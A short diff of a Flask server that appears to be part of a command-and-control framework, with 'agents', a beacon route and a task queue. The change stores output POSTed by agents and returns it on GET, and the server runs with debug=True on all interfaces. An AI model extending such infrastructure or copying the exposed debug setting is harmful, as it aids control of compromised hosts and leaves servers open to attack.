@@ -17,6 +17,7 @@ agents = db.agents
 
 map = {}
 
+output_list = []
 
 def run():
     app.run(debug=True, host="0.0.0.0")
@@ -112,11 +113,19 @@ def beacon():
         return ""
 
 
-@app.route("/api/output", methods=["POST"])
+@app.route("/api/output", methods=('POST', 'GET'))
 def output():
-    print(request.data)
+    if request.method == 'POST':
+        data = strip(request.data)
+        output_list.append(data)
+        print(data)
 
-    return ""
+        return ""
+    else:
+        if (len(output_list) > 0):
+            return output_list.pop()
+        else:
+            return ""
 
 
 @app.route("/api/client/queue", methods=["POST"])
